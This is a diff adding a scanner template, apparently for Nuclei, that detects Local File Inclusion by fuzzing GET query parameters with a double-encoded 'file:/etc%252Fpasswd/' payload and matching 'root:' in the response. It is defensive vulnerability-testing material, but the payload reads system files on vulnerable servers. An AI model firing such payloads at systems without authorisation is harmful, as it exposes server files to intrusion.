@@ -1,0 +1,38 @@
+id: fuzz-lfi-custom
+
+info:
+  name: Custom Local File Inclusion Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect Local File Inclusion (LFI) vulnerabilities using a specified payload to access sensitive files.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      lfi:
+        - "file:/etc%252Fpasswd/"  # URL-encoded payload to access /etc/passwd
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{lfi}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"  # Match the content of /etc/passwd, looking for root user
+
+      - type: status
+        status:
+          - 200  # Expect a 200 OK status signifying the file was included
